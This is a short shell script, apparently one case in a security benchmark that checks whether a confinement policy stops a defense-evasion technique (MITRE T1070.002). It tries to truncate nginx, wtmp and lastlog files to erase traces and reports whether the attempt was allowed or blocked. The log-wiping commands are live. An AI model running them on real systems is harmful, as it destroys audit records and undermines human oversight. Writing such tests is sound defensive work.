#!/usr/bin/env sh
# Tactic: Defense Evasion (TA0005)
# Technique: Indicator Removal - Clear Linux or Mac System Logs (T1070.002)
# Attack: truncate log files to erase traces. nginx appends to its logs; it
# never truncates them to zero.
# Marker: outcome=allowed if a truncate succeeded, blocked if all prevented.
set -u
TAG="17-clear-logs"
KIND="attack"
ok=1
for f in /var/log/nginx/access.log /var/log/nginx/error.log /var/log/wtmp /var/log/lastlog; do
  if [ -f "$f" ]; then
    { : > "$f"; } 2>/dev/null && ok=0
  fi
done
# Also try to create-and-truncate a fresh log path (covers empty /var/log).
{ : > /var/log/.bench-clear; } 2>/dev/null && ok=0
rm -f /var/log/.bench-clear 2>/dev/null || true
if [ "$ok" -eq 0 ]; then OUT="allowed"; else OUT="blocked"; fi
printf 'BENCH_RESULT tag=%s kind=%s outcome=%s rc=%s\n' "$TAG" "$KIND" "$OUT" "$ok"
